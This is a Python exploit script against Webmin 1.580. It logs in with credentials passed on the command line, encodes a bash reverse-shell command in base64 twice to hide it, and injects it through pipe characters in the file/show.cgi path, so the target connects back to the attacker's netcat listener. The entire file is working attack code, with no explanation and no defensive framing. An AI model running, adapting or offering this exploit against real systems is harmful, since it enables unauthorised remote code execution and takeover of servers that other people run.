import requests
import os
import sys
import base64
import random
import string

if len(sys.argv) != 6 or sys.argv[1] in ['-h', '--help']:
    print("Exploit Webmin 1.580")
    print("Please start netcat listener on LPORT")
    print("usage :", sys.argv[0], "URL USERNAME PASSWORD LHOST LPORT")
    exit(2)
else:
    url = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    lhost = sys.argv[4]
    lport = sys.argv[5]


s = requests.Session() 

data = f"page=%2F&user={username}&pass={password}"
headers = {}
headers["Content-Type"] = "application/x-www-form-urlencoded"
headers["Content-Length"] = str(len(data))
cookies = {"testing": "1", "sid": "x"}

res = s.post(url + "session_login.cgi", data=data, headers=headers, cookies=cookies)

cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1".encode()
cmd = base64.b64encode(cmd)
cmd = base64.b64encode(cmd)
cmd = f"echo {cmd.decode()} | base64 -d | base64 -d | bash"

random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=5))

res = s.get(url + f"file/show.cgi/bin/{random_string}|{cmd}|")
